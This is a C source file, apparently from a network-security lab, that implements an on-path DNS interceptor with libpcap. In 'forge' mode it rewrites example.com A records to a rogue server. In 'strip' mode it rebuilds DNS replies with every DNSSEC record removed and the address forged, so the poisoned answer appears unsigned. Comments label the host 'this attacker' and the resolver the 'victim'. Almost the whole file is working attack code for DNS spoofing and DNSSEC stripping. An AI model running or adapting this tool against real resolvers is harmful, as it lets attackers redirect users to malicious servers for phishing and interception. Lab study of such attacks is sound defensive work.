/*
 * On-path DNS interceptor for the resolver subnet.
 *
 * The core-router sends every reply bound for the resolver (172.16.2.10) to us
 * first. The kernel does not forward them (ip_forward is 0), so this program is
 * the only thing that passes them on: it captures each reply with libpcap and
 * re-injects it toward the resolver.
 *
 *   relay : every reply forwarded unchanged (transparent).
 *   forge : replies answering "example.com A" have their address rewritten to
 *           the rogue server; everything else unchanged.   (Phase 2)
 *   strip : for example.com replies that carry an answer, rebuild the message
 *           with every DNSSEC record (RRSIG/DNSKEY/DS/NSEC/NSEC3) removed and
 *           the A rewritten to the rogue server, so the answer looks unsigned.
 *           (Phase 4)
 *
 * Build:  gcc -O2 -Wall -o interceptor interceptor.c -lpcap
 * Run:    ./interceptor relay|forge|strip  eth0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/sockios.h>

#define ETH_HLEN       14
#define ETHERTYPE_IP4  0x0800
#define ETHERTYPE_ARP  0x0806

/* record types we care about */
#define T_A       1
#define T_NS      2
#define T_CNAME   5
#define T_SOA     6
#define T_PTR    12
#define T_DS     43
#define T_RRSIG  46
#define T_NSEC   47
#define T_DNSKEY 48
#define T_NSEC3  50

static const char *TARGET_NAME = "example.com";
static const char *ROGUE_IP    = "172.16.1.30";   /* rogue-web */
static const char *RESOLVER_IP = "172.16.2.10";   /* victim resolver */
static const char *MY_IP       = "172.16.2.100";  /* this attacker */

/* example.com as an uncompressed wire-format name */
static const uint8_t TARGET_WIRE[] =
    {7,'e','x','a','m','p','l','e', 3,'c','o','m', 0};

static int is_dnssec_type(uint16_t t)
{
    return t == T_RRSIG || t == T_DNSKEY || t == T_DS ||
           t == T_NSEC  || t == T_NSEC3;
}

/* ---- checksums ---------------------------------------------------------- */

static void fix_ip_checksum(uint8_t *iph, int ihl)
{
    iph[10] = iph[11] = 0;
    uint32_t sum = 0;
    for (int i = 0; i + 1 < ihl; i += 2)
        sum += (iph[i] << 8) | iph[i + 1];
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t c = (uint16_t)~sum;
    iph[10] = c >> 8; iph[11] = c & 0xff;
}

static uint16_t udp_checksum(const uint8_t *ipsrc, const uint8_t *ipdst,
                             const uint8_t *udp, int udplen)
{
    uint32_t sum = 0;
    sum += (ipsrc[0] << 8) | ipsrc[1]; sum += (ipsrc[2] << 8) | ipsrc[3];
    sum += (ipdst[0] << 8) | ipdst[1]; sum += (ipdst[2] << 8) | ipdst[3];
    sum += 17; sum += udplen;
    for (int i = 0; i + 1 < udplen; i += 2) sum += (udp[i] << 8) | udp[i + 1];
    if (udplen & 1) sum += udp[udplen - 1] << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t c = (uint16_t)~sum;
    return c == 0 ? 0xffff : c;
}

/* ---- DNS name helpers --------------------------------------------------- */

/* Expand a (possibly compressed) name at `pos` into uncompressed wire form in
   `out`. Returns bytes consumed in the ORIGINAL message at `pos` (up to and
   including the first pointer), sets *outlen. -1 on error. */
static int read_name(const uint8_t *msg, int msglen, int pos,
                     uint8_t *out, int *outlen)
{
    int op = 0, jumped = 0, adv = -1, guard = 0, p = pos;
    while (p >= 0 && p < msglen) {
        uint8_t c = msg[p];
        if ((c & 0xc0) == 0xc0) {
            if (p + 1 >= msglen) return -1;
            if (!jumped) adv = (p + 2) - pos;
            jumped = 1;
            p = ((c & 0x3f) << 8) | msg[p + 1];
            if (++guard > 128) return -1;
            continue;
        }
        if (c > 63) return -1;
        if (c == 0) { out[op++] = 0; if (!jumped) adv = (p + 1) - pos;
                      *outlen = op; return adv; }
        if (p + 1 + c > msglen || op + 1 + c > 255) return -1;
        out[op++] = c;
        memcpy(out + op, msg + p + 1, c); op += c;
        p += 1 + c;
    }
    return -1;
}

/* case-insensitive compare of two uncompressed wire names */
static int name_eq(const uint8_t *a, const uint8_t *b)
{
    int i = 0;
    for (;;) {
        uint8_t la = a[i], lb = b[i];
        if (la != lb) return 0;
        if (la == 0) return 1;
        for (int j = 1; j <= la; j++) {
            char x = a[i + j], y = b[i + j];
            if (x >= 'A' && x <= 'Z') x += 32;
            if (y >= 'A' && y <= 'Z') y += 32;
            if (x != y) return 0;
        }
        i += la + 1;
    }
}

/* Is the question name `want`? (ignores qtype) */
static int question_name_is(const uint8_t *dns, int dnslen, const char *want)
{
    if (dnslen < 12 || ((dns[4] << 8) | dns[5]) < 1) return 0;
    char name[256]; int n = 0, p = 12;
    while (p < dnslen && dns[p] != 0) {
        int len = dns[p++];
        if (len & 0xc0) return 0;
        if (p + len > dnslen || n + len + 1 >= (int)sizeof(name)) return 0;
        for (int i = 0; i < len; i++) name[n++] = dns[p++];
        name[n++] = '.';
    }
    if (n > 0) n--;
    name[n] = 0;
    if ((int)strlen(want) != n) return 0;
    for (int i = 0; i < n; i++) {
        char a = name[i], b = want[i];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (b >= 'A' && b <= 'Z') b += 32;
        if (a != b) return 0;
    }
    return 1;
}

/* question is `want` AND qtype == A (used by forge mode) */
static int question_is_a(const uint8_t *dns, int dnslen, const char *want)
{
    if (!question_name_is(dns, dnslen, want)) return 0;
    int p = 12;
    while (p < dnslen && dns[p] != 0) p += dns[p] + 1;
    p += 1;
    if (p + 2 > dnslen) return 0;
    return ((dns[p] << 8) | dns[p + 1]) == T_A;
}

/* In-place forge: rewrite every A record in the ANSWER section (Phase 2). */
static int forge_answers(uint8_t *dns, int dnslen, uint32_t rogue_be)
{
    int an = (dns[6] << 8) | dns[7];
    int p = 12;
    while (p < dnslen && dns[p] != 0) p += dns[p] + 1;    /* skip qname */
    p += 1 + 4;                                           /* root + qtype/qclass */
    int changed = 0;
    for (int i = 0; i < an; i++) {
        while (p < dnslen) { uint8_t c = dns[p];
            if (c == 0) { p++; break; }
            if (c & 0xc0) { p += 2; break; }
            p += c + 1; }
        if (p + 10 > dnslen) break;
        uint16_t type  = (dns[p] << 8) | dns[p + 1];
        uint16_t rdlen = (dns[p + 8] << 8) | dns[p + 9];
        int rdata = p + 10;
        if (rdata + rdlen > dnslen) break;
        if (type == T_A && rdlen == 4) { memcpy(dns + rdata, &rogue_be, 4); changed++; }
        p = rdata + rdlen;
    }
    return changed;
}

/* Rebuild the DNS message into `out`, dropping every DNSSEC record and
   rewriting the example.com A to the rogue address. All names are written
   uncompressed so no compression pointer can dangle. Returns new length. */
static int strip_and_forge(const uint8_t *in, int inlen, uint8_t *out,
                           uint32_t rogue_be)
{
    if (inlen < 12) return -1;
    memcpy(out, in, 12);
    int counts[3] = { (in[6] << 8) | in[7], (in[8] << 8) | in[9],
                      (in[10] << 8) | in[11] };
    int qd = (in[4] << 8) | in[5];
    int ip = 12, op = 12, nl;
    uint8_t nb[256];

    for (int q = 0; q < qd; q++) {
        int adv = read_name(in, inlen, ip, nb, &nl);
        if (adv < 0 || ip + adv + 4 > inlen) return -1;
        memcpy(out + op, nb, nl); op += nl;
        memcpy(out + op, in + ip + adv, 4); op += 4;
        ip += adv + 4;
    }

    int newc[3] = {0, 0, 0};
    for (int s = 0; s < 3; s++) {
        for (int r = 0; r < counts[s]; r++) {
            int adv = read_name(in, inlen, ip, nb, &nl);
            if (adv < 0) return -1;
            int rr = ip + adv;
            if (rr + 10 > inlen) return -1;
            uint16_t type  = (in[rr] << 8) | in[rr + 1];
            uint16_t rdlen = (in[rr + 8] << 8) | in[rr + 9];
            int rdata = rr + 10;
            if (rdata + rdlen > inlen) return -1;
            ip = rdata + rdlen;

            if (is_dnssec_type(type)) continue;             /* drop it */

            memcpy(out + op, nb, nl); op += nl;             /* owner name */
            memcpy(out + op, in + rr, 8); op += 8;          /* type/class/ttl */
            int rdlpos = op; op += 2;                       /* rdlength slot */
            int rdstart = op;

            if (type == T_A && rdlen == 4 && name_eq(nb, TARGET_WIRE)) {
                memcpy(out + op, &rogue_be, 4); op += 4;    /* forge target A */
            } else if (type == T_NS || type == T_CNAME || type == T_PTR) {
                int a2 = read_name(in, inlen, rdata, out + op, &nl);
                if (a2 < 0) return -1; op += nl;
            } else if (type == T_SOA) {
                int a2 = read_name(in, inlen, rdata, out + op, &nl); op += nl;
                if (a2 < 0) return -1;
                int a3 = read_name(in, inlen, rdata + a2, out + op, &nl); op += nl;
                if (a3 < 0) return -1;
                int rest = rdlen - (a2 + a3);
                if (rest < 0 || rest > 20) return -1;
                memcpy(out + op, in + rdata + a2 + a3, rest); op += rest;
            } else {
                memcpy(out + op, in + rdata, rdlen); op += rdlen;  /* verbatim */
            }

            int rl = op - rdstart;
            out[rdlpos] = rl >> 8; out[rdlpos + 1] = rl & 0xff;
            newc[s]++;
        }
    }
    out[6] = newc[0] >> 8; out[7] = newc[0] & 0xff;
    out[8] = newc[1] >> 8; out[9] = newc[1] & 0xff;
    out[10] = newc[2] >> 8; out[11] = newc[2] & 0xff;
    return op;
}

/* ---- link-layer helpers ------------------------------------------------- */

static int get_if_mac(const char *ifname, uint8_t *out)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(out, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static int arp_resolve(pcap_t *h, const uint8_t *mymac,
                       const char *myip, const char *targetip, uint8_t *out)
{
    uint8_t spa[4], tpa[4];
    inet_pton(AF_INET, myip, spa);
    inet_pton(AF_INET, targetip, tpa);

    uint8_t req[42];
    memset(req, 0, sizeof(req));
    memset(req, 0xff, 6); memcpy(req + 6, mymac, 6);
    req[12] = 0x08; req[13] = 0x06;
    req[14] = 0x00; req[15] = 0x01; req[16] = 0x08; req[17] = 0x00;
    req[18] = 6; req[19] = 4; req[20] = 0x00; req[21] = 0x01;
    memcpy(req + 22, mymac, 6); memcpy(req + 28, spa, 4); memcpy(req + 38, tpa, 4);

    struct bpf_program fp;
    if (pcap_compile(h, &fp, "arp", 1, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(h, &fp); pcap_freecode(&fp);
    }
    for (int tries = 0; tries < 40; tries++) {
        pcap_inject(h, req, sizeof(req));
        for (int k = 0; k < 50; k++) {
            struct pcap_pkthdr *hdr; const uint8_t *d;
            int r = pcap_next_ex(h, &hdr, &d);
            if (r == 0) break;
            if (r != 1 || hdr->caplen < 42) continue;
            if (d[12] != 0x08 || d[13] != 0x06) continue;
            if (((d[20] << 8) | d[21]) == 2 && memcmp(d + 28, tpa, 4) == 0) {
                memcpy(out, d + 22, 6); return 0;
            }
        }
    }
    return -1;
}

/* ---- main --------------------------------------------------------------- */

int main(int argc, char **argv)
{
    const char *mode   = argc > 1 ? argv[1] : "relay";
    const char *ifname = argc > 2 ? argv[2] : "eth0";
    int forge = (strcmp(mode, "forge") == 0);
    int strip = (strcmp(mode, "strip") == 0);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *h = pcap_open_live(ifname, 65535, 1, 100, errbuf);
    if (!h) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }
    if (pcap_datalink(h) != DLT_EN10MB) { fprintf(stderr, "not ethernet\n"); return 1; }
    pcap_setdirection(h, PCAP_D_IN);

    uint8_t mymac[6], resolver_mac[6];
    if (get_if_mac(ifname, mymac) != 0) { fprintf(stderr, "no MAC\n"); return 1; }
    if (arp_resolve(h, mymac, MY_IP, RESOLVER_IP, resolver_mac) != 0) {
        fprintf(stderr, "could not ARP-resolve %s\n", RESOLVER_IP); return 1;
    }

    struct bpf_program fp;
    char filter[128];
    snprintf(filter, sizeof(filter), "ip dst host %s", RESOLVER_IP);
    if (pcap_compile(h, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) != 0) {
        fprintf(stderr, "filter failed\n"); return 1;
    }
    pcap_setfilter(h, &fp); pcap_freecode(&fp);

    uint32_t rogue_be;
    inet_pton(AF_INET, ROGUE_IP, &rogue_be);

    printf("[interceptor] mode=%s iface=%s  -> relaying to resolver %s\n",
           mode, ifname, RESOLVER_IP);
    if (forge || strip)
        printf("[interceptor] target %s A -> %s\n", TARGET_NAME, ROGUE_IP);
    fflush(stdout);

    static uint8_t buf[65536];
    static uint8_t dnsbuf[65536];
    while (1) {
        struct pcap_pkthdr *hdr; const uint8_t *data;
        int r = pcap_next_ex(h, &hdr, &data);
        if (r == 0) continue;
        if (r < 0) break;
        int len = hdr->caplen;
        if (len < ETH_HLEN + 20 || len > (int)sizeof(buf)) continue;
        if (memcmp(data + 6, mymac, 6) == 0) continue;
        if (((data[12] << 8) | data[13]) != ETHERTYPE_IP4) continue;

        memcpy(buf, data, len);
        uint8_t *ip  = buf + ETH_HLEN;
        int ihl      = (ip[0] & 0x0f) * 4;
        uint8_t proto = ip[9];
        int outlen   = len;
        const char *tag = "relay";

        if (proto == 17) {                                   /* UDP */
            uint8_t *udp = ip + ihl;
            int udplen = (udp[4] << 8) | udp[5];
            if (ETH_HLEN + ihl + udplen <= len && udplen >= 8) {
                uint8_t *dns = udp + 8;
                int dnslen = udplen - 8;
                int sport = (udp[0] << 8) | udp[1];

                if (forge && sport == 53 && dnslen > 0 &&
                    question_is_a(dns, dnslen, TARGET_NAME)) {
                    if (forge_answers(dns, dnslen, rogue_be) > 0) tag = "FORGED";
                } else if (strip && sport == 53 && dnslen > 12 &&
                           question_name_is(dns, dnslen, TARGET_NAME) &&
                           ((dns[6] << 8 | dns[7]) >= 1)) {       /* has an answer */
                    int ndns = strip_and_forge(dns, dnslen, dnsbuf, rogue_be);
                    if (ndns > 0 && ndns <= dnslen) {
                        memcpy(dns, dnsbuf, ndns);
                        udplen = 8 + ndns;
                        udp[4] = udplen >> 8; udp[5] = udplen & 0xff;
                        int iptot = ihl + udplen;
                        ip[2] = iptot >> 8; ip[3] = iptot & 0xff;
                        outlen = ETH_HLEN + iptot;
                        tag = "STRIPPED";
                    }
                }
                udp[6] = udp[7] = 0;
                uint16_t c = udp_checksum(ip + 12, ip + 16, udp, udplen);
                udp[6] = c >> 8; udp[7] = c & 0xff;
            }
        }
        fix_ip_checksum(ip, ihl);
        memcpy(buf, resolver_mac, 6); memcpy(buf + 6, mymac, 6);
        if (pcap_inject(h, buf, outlen) >= 0) {
            printf("[%s] %d bytes -> %s\n", tag, outlen, RESOLVER_IP);
            fflush(stdout);
        }
    }
    pcap_close(h);
    return 0;
}
